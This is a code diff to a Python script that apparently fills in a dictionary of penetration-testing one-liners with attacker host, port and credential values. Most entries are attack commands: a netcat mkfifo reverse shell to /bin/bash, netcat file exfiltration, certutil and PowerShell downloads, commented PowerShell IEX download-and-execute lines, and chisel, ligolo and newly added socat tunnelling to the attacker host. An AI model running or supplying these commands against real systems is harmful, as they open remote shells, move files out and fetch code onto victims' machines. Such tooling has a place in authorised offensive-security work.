@@ -17,7 +17,7 @@ commands = {
     "http"         : "http://$LHOST/$FILE",
     "nc-file"      : "nc -w 3 $LHOST $LPORT < $FILE",
     "nc-rev"       : "rm /tmp/f; mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1",
-    "ps-wr"        : "Invoke-WebRequest http://$LHOST/$FILE -OutFile $FILE",
+    "ps"           : "Invoke-WebRequest http://$LHOST/$FILE -OutFile $FILE",
     # "ps-dl"        : "powershell \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/$FILE','$FILE')\"",
     # "ps-ex"        : "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/$FILE')\"",
     "certutil"     : "certutil -urlcache -split -f http://$LHOST/$FILE",
@@ -34,6 +34,7 @@ commands = {
     "chisel-win"   : "start ./chisel 'client $LHOST:9000 R:1080:socks'",
     "ligolo"       : "./agent -ignore-cert -connect $LHOST:11601  &",
     "ligolo-win"   : "start ./agent.exe '-ignore-cert -connect $LHOST:11601'",
+    "socat"        : "./socat tcp-listen:$LPORT,fork,reuseaddr tcp:$LHOST:$LPORT",
 }
 
 def replace(input, vars):
@@ -101,6 +102,10 @@ def main(args):
         vars["$LHOST"] += f":{args.lport}"
     if args.rhost:
         vars["$RHOST"] = args.rhost
+    if args.user:
+        vars["$UN"] = args.user
+    if args.password:
+        vars["$PW"] = args.password
     
     for key, value in commands.items():
         commands[key] = replace(value, vars)   
